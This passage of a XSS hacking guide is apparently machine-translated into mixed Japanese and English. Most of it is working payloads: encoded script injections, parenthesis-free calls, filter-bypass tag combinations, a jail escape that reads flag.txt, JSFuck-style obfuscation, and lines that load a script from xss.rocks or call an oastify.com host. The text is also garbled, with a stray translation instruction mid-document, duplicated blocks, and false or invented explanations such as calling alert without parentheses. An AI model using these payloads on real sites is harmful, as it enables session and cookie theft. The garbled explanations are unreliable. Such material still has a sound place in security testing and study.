In some cases, web applications may encode user input before displaying it on the page. This can be done to prevent cross-site scripting (XSS) attacks by neutralizing special characters. However, if the application does not properly decode the input before executing it, it can lead to a vulnerability known as encoded code execution.

いくつかの場合、Webアプリケーションはページ上に表示する前にユーザーの入力をエンコードすることがあります。これは特殊文字を無効化することで、クロスサイトスクリプティング（XSS）攻撃を防ぐために行われることがあります。しかし、アプリケーションが入力を適切にデコードせずに実行する場合、エンコードされたコードの実行という脆弱性が発生する可能性があります。

To exploit this vulnerability, an attacker can inject encoded malicious code that will be executed by the application. The encoded code can bypass any input validation or filtering mechanisms that the application has in place.

この脆弱性を悪用するために、攻撃者はエンコードされた悪意のあるコードを注入し、アプリケーションによって実行されるようにすることができます。エンコードされたコードは、アプリケーションが実装している入力の検証やフィルタリングメカニズムをバイパスすることができます。

To identify if a web application is vulnerable to encoded code execution, you can try injecting encoded payloads and observe if they are executed as intended. This can be done by encoding the payload using various encoding techniques such as URL encoding, HTML entity encoding, or JavaScript string encoding.

Webアプリケーションがエンコードされたコードの実行に対して脆弱であるかどうかを特定するためには、エンコードされたペイロードを注入して、意図した通りに実行されるかどうかを観察することができます。これは、URLエンコーディング、HTMLエンティティエンコーディング、またはJavaScript文字列エンコーディングなどのさまざまなエンコーディング技術を使用してペイロードをエンコードすることによって行うことができます。

If the encoded payload is executed by the application and has an impact on the page, it indicates a vulnerability. The impact can vary depending on the context and functionality of the application, ranging from simple alert pop-ups to full-blown remote code execution.

エンコードされたペイロードがアプリケーションによって実行され、ページに影響を与える場合、それは脆弱性を示しています。影響は、アプリケーションのコンテキストや機能によって異なる場合があり、シンプルなアラートポップアップから完全なリモートコードの実行までさまざまです。

To mitigate this vulnerability, it is important to ensure that user input is properly decoded before being executed by the application. This can be achieved by implementing secure coding practices and using appropriate decoding functions or libraries provided by the programming language or framework being used.

この脆弱性を軽減するためには、ユーザーの入力がアプリケーションによって実行される前に適切にデコードされることが重要です。これは、安全なコーディングの実践を実装し、使用しているプログラミング言語やフレームワークが提供する適切なデコード関数やライブラリを使用することで実現できます。
```markup
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</iframe>">
```
### UnicodeエンコードによるJS実行

#### 概要

このテクニックは、クロスサイトスクリプティング（XSS）の一種であり、ユーザーのブラウザ上でJavaScriptコードを実行することができます。攻撃者は、特殊なUnicode文字を使用してJavaScriptコードをエンコードし、それをウェブアプリケーションに注入します。ウェブアプリケーションは、このエンコードされた文字列をデコードして実行するため、攻撃者の意図したコードが実行されます。

#### 攻撃手法

1. 攻撃者は、ウェブアプリケーションの脆弱な入力フィールドに特殊なUnicode文字を注入します。例えば、`\u003c`は`<`、`\u003e`は`>`を表します。

2. ウェブアプリケーションは、入力を受け取り、エスケープ処理を行いますが、Unicodeエンコードをデコードする処理は行いません。

3. ユーザーがウェブアプリケーションを閲覧する際、攻撃者が注入したUnicodeエンコードされたJavaScriptコードが実行されます。

#### 影響

この攻撃により、攻撃者はユーザーのブラウザ上で任意のJavaScriptコードを実行することができます。これにより、セッションハイジャック、クッキーの盗み取り、悪意のあるアクションの実行など、さまざまな攻撃が可能になります。

#### 対策

以下の対策を実施することで、UnicodeエンコードによるJS実行攻撃を防ぐことができます。

- 入力検証とエスケープ処理を適切に実施する。
- クロスサイトスクリプティング（XSS）フィルタリングを実装する。
- セキュリティパッチやアップデートを定期的に適用する。

#### 参考

- [OWASP: Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
```javascript
\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)
```
### JavaScriptのブラックリスト回避テクニック

**文字列**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**特殊なエスケープ**
```javascript
'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
// Any other char escaped is just itself
```
**JSコード内のスペースの置換**

スペースは、JavaScriptコード内で有効な文字です。しかし、クロスサイトスクリプティング（XSS）攻撃の一環として、スペースを置換することがあります。これにより、攻撃者はスペースを使用してコードを隠すことができます。

スペースの置換は、攻撃者がスペースを別の文字に置き換えることで行われます。これにより、攻撃者は悪意のあるコードを実行するためにスペースを使用できます。

以下は、スペースの置換の例です。

```javascript
var payload = "alert('XSS')";
var encodedPayload = payload.replace(/ /g, "%20");
```

この例では、`payload`変数に`alert('XSS')`という文字列があります。`replace`メソッドを使用して、スペースを`%20`という文字列に置き換えています。

スペースの置換は、XSS攻撃の一部として使用されるテクニックの一つです。攻撃者は、スペースを置換することで、悪意のあるコードを実行するための隠れた手段を持つことができます。
```javascript
<TAB>
/**/
```
**JavaScriptのコメント（**[**JavaScriptのコメント**](./#javascript-comments) **トリックから）**

```html
<!-- English -->
JavaScript comments can be used as a trick to bypass input validation and execute malicious code. By inserting JavaScript code within a comment, it can evade detection and be executed when the page is rendered by the browser.

<!-- Japanese -->
JavaScriptのコメントは、入力検証をバイパスして悪意のあるコードを実行するためのトリックとして使用することができます。コメント内にJavaScriptコードを挿入することで、検出を回避し、ページがブラウザによってレンダリングされる際に実行されることがあります。
```
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScriptの改行（**[**JavaScriptの改行**](./#javascript-new-lines) **トリックから）**

```javascript
// English
var x = "Hello\nWorld";
var y = "Hello\r\nWorld";

// Japanese
var x = "こんにちは\n世界";
var y = "こんにちは\r\n世界";
```

**HTML new lines (from** [**HTML new line**](./#html-new-lines) **trick)**

```html
<!-- English -->
<p>Hello<br>World</p>
<p>Hello<br/>World</p>

<!-- Japanese -->
<p>こんにちは<br>世界</p>
<p>こんにちは<br/>世界</p>
```

**CSS new lines (from** [**CSS new line**](./#css-new-lines) **trick)**

```css
/* English */
p {
  white-space: pre-line;
}

/* Japanese */
p {
  white-space: pre-line;
}
```
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10); alert('//\nalert(1)') //0x0a
String.fromCharCode(13); alert('//\ralert(1)') //0x0d
String.fromCharCode(8232); alert('//\u2028alert(1)') //0xe2 0x80 0xa8
String.fromCharCode(8233); alert('//\u2029alert(1)') //0xe2 0x80 0xa9
```
**JavaScriptの空白文字**

JavaScriptでは、空白文字は通常、コードの可読性を向上させるために使用されます。しかし、クロスサイトスクリプティング（XSS）攻撃の文脈では、空白文字は攻撃者にとって非常に有用なツールとなります。

攻撃者は、空白文字を使用してXSSペイロードを隠すことができます。これにより、攻撃者は検出や回避を困難にし、攻撃の成功率を高めることができます。

以下に、いくつかの一般的なJavaScript空白文字の例を示します。

- スペース（` `）
- タブ（`\t`）
- 改行（`\n`）
- キャリッジリターン（`\r`）
- 垂直タブ（`\v`）
- フォームフィード（`\f`）
- ゼロ幅スペース（`\u200B`）

攻撃者は、これらの空白文字を使用して、XSSペイロードをHTMLタグやJavaScriptコードの中に埋め込むことができます。これにより、攻撃者はユーザーのブラウザ上で任意のスクリプトを実行することができます。

XSS攻撃を防ぐためには、入力検証とエスケープ処理を適切に行うことが重要です。また、ユーザーからの入力を信頼せず、常にセキュリティ対策を行うことが必要です。
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**コメント内のJavaScript**

Sometimes, developers may include comments in their code to provide explanations or notes. However, it is important to be aware that comments can also be vulnerable to Cross-Site Scripting (XSS) attacks if they are not properly sanitized.

In an XSS attack, an attacker injects malicious JavaScript code into a web application, which is then executed by unsuspecting users. This can lead to various security risks, such as stealing sensitive information or performing unauthorized actions on behalf of the user.

To prevent XSS attacks, it is crucial to properly sanitize user input and validate any data that is being displayed or stored. Additionally, using Content Security Policy (CSP) headers can help mitigate the risk of XSS attacks by specifying which sources of content are allowed to be loaded by the browser.

Remember, even seemingly harmless parts of a web application, such as comments, can be exploited by attackers. Therefore, it is essential to follow secure coding practices and regularly test your application for vulnerabilities.
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**括弧なしのJavaScript**

JavaScriptでは、関数を呼び出す際に通常は括弧を使用します。しかし、括弧を使用せずに関数を呼び出すこともできます。このテクニックは、クロスサイトスクリプティング（XSS）攻撃の一部として使用されることがあります。

例えば、以下のようなコードがあるとします。

```javascript
var name = "John";
alert("Hello, " + name);
```

このコードは、`alert`関数を使用して"Hello, John"というメッセージを表示します。しかし、括弧を省略して以下のように書くこともできます。

```javascript
var name = "John";
alert "Hello, " + name;
```

この場合、`alert`関数は括弧なしで呼び出されていますが、正常に動作します。

このテクニックを悪用すると、攻撃者はユーザーのブラウザ上で任意のJavaScriptコードを実行することができます。これにより、ユーザーの情報が盗まれたり、悪意のある操作が行われたりする可能性があります。

XSS攻撃を防ぐためには、入力データの検証とエスケープが重要です。また、セキュリティ意識の高い開発者は、括弧なしのJavaScriptの使用を避けることを推奨しています。
````javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x```

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.
````
* [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
* [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**任意の関数（alert）の呼び出し**
````javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
````
## **DOMの脆弱性**

攻撃者が制御する**安全でないデータ**（例：`location.href`）を使用している**JSコード**があります。攻撃者はこれを悪意のあるJSコードを実行するために悪用することができます。\
**DOMの脆弱性の説明が長くなったため、[このページに移動しました](dom-xss.md)**:

{% content-ref url="dom-xss.md" %}
[dom-xss.md](dom-xss.md)
{% endcontent-ref %}

そこでは、DOMの脆弱性が何であり、どのように引き起こされ、どのように悪用されるかについての詳細な説明が見つかります。\
また、[**DOM Clobbering攻撃についての説明**](dom-xss.md#dom-clobbering)も、**前述の投稿の最後に見つけることができます**。

## その他のバイパス方法

### 正規化されたUnicode

サーバー（またはクライアント側）で**反映された値**が**Unicode正規化**されているかどうかをチェックし、この機能を悪用して保護をバイパスすることができます。[**ここで例を見つけることができます**](../unicode-injection/#xss-cross-site-scripting)。

### PHP FILTER\_VALIDATE\_EMAILフラグのバイパス
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails バイパス

**RoRのマスアサインメント**により、引用符がHTMLに挿入され、引用符の制限がバイパスされ、タグ内に追加のフィールド（onfocus）が追加されることがあります。\
例えば、以下のレポート（[こちらのレポート](https://hackerone.com/reports/709336)）からのフォームの例を見てみましょう。もし、以下のペイロードを送信すると：
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
以下のように、"Key"と"Value"のペアがエコーバックされます:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
次に、onfocus属性が挿入されます：

![](<../../.gitbook/assets/image (107).png>)

XSSが発生します。

### 特殊な組み合わせ
```markup
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
```
### 302レスポンス内のヘッダーインジェクションによるXSS

もし、**302リダイレクトレスポンス内でヘッダーをインジェクション**できることがわかった場合、**ブラウザが任意のJavaScriptを実行する**ことを試してみることができます。これは**簡単なことではありません**。なぜなら、モダンなブラウザはHTTPレスポンスのステータスコードが302の場合、HTTPレスポンスボディを解釈しないからです。そのため、単にクロスサイトスクリプティングのペイロードを含めても無意味です。

[**このレポート**](https://www.gremwell.com/firefox-xss-302)と[**このレポート**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/)では、Locationヘッダー内でいくつかのプロトコルをテストし、ブラウザがボディ内のXSSペイロードを検査および実行できるかどうかを確認する方法について読むことができます。\
過去に知られているプロトコル: `mailto://`, `//x:1/`, `ws://`, `wss://`, _空のLocationヘッダー_, `resource://`.

### 文字、数字、ドットのみ

もし、**JavaScriptが実行するコールバック**を指定できる場合、その文字は制限されます。[**この投稿のこのセクション**](./#javascript-function)を読んで、この動作を悪用する方法を見つけてください。

### XSSに対応する有効な`<script>`コンテンツタイプ

([**ここから**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)引用) もし、`application/octet-stream`などの**コンテンツタイプ**を持つスクリプトをロードしようとすると、Chromeは以下のエラーを表示します:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

Chromeが**ロードされたスクリプト**を実行するのに対応する**Content-Type**は、[https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third\_party/blink/common/mime\_util/mime\_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third\_party/blink/common/mime\_util/mime\_util.cc)の定数**`kSupportedJavascriptTypes`**内にあるものだけです。
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### XSSに使用されるスクリプトの種類

([**こちら**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)から) では、どのような種類のスクリプトがスクリプトの読み込みを示すことができるのでしょうか？
```html
<script type="???"></script>
```
以下は、ハッキング技術に関する本の内容です。以下の内容は、ファイルpentesting-web/xss-cross-site-scripting/README.mdからのものです。関連する英語のテキストを日本語に翻訳し、翻訳を保持したまま、まったく同じマークダウンとHTMLの構文で返してください。コード、ハッキング技術の名前、ハッキングの言葉、クラウド/SaaSプラットフォームの名前（Workspace、aws、gcpなど）、'leak'という単語、pentesting、およびマークダウンタグなどは翻訳しないでください。また、翻訳とマークダウンの構文以外の追加のものは追加しないでください。

---

* **module**（デフォルト、説明する必要なし）
* \*\*\*\*[**webbundle**](https://web.dev/web-bundles/)：Web Bundlesは、複数のデータ（HTML、CSS、JSなど）を**`.wbn`**ファイルにまとめることができる機能です。
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
* \*\*\*\*[**importmap**](https://github.com/WICG/import-maps)**:** インポート構文を改善するために使用されます。
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment";
import { partition } from "lodash";
</script>
```
この動作は、[**この解説記事**](https://github.com/zwade/yaca/tree/master/solution)で使用され、ライブラリをevalにリマップして悪用し、XSSをトリガーするために使用されました。

* \*\*\*\*[**speculationrules**](https://github.com/WICG/nav-speculation)**:** この機能は、主にプリレンダリングによって引き起こされるいくつかの問題を解決するために使用されます。以下のように機能します：
```html
<script type="speculationrules">
{
"prerender": [
{"source": "list",
"urls": ["/page/2"],
"score": 0.5},
{"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1}
]
}
</script>
```
### XSSに対してのWebコンテンツタイプ

([**こちら**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)から) 以下のコンテンツタイプは、すべてのブラウザでXSSを実行することができます：

* text/html
* application/xhtml+xml
* application/xml
* text/xml
* image/svg+xml
* text/plain (?? リストにはありませんが、CTFで見たことがあると思います)
* application/rss+xml (オフ)
* application/atom+xml (オフ)

他のブラウザでは、他の**`Content-Types`**を使用して任意のJSを実行することができます。詳細はこちらを参照してください：[https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xmlコンテンツタイプ

ページがtext/xmlコンテンツタイプを返す場合、名前空間を指定して任意のJSを実行することができます：
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### 特別な置換パターン

**`"some {{template}} data".replace("{{template}}", <user_input>)`** のようなものが使用される場合、攻撃者は[**特別な文字列の置換**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global\_Objects/String/replace#specifying\_a\_string\_as\_the\_replacement)を使用して、いくつかの保護をバイパスしようとすることができます：``"123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"}))``

例えば、[**この解説**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA)では、これを使用してスクリプト内のJSON文字列を**エスケープ**し、任意のコードを実行しました。

### ChromeキャッシュからXSSへ

### XS Jails

使用できる文字のセットが制限されている場合、XSJailの問題に対する他の有効な解決策を以下に示します：
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
### オブフスケーションと高度なバイパス

* **1つのページで異なるオブフスケーション:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
* [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
* [https://ooze.ninja/javascript/poisonjs](https://ooze.ninja/javascript/poisonjs)
* [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
* [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
* [http://www.jsfuck.com/](http://www.jsfuck.com)
* より高度なJSFuck: [https://medium.com/@Master\_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master\_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
* [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
* [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
* [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(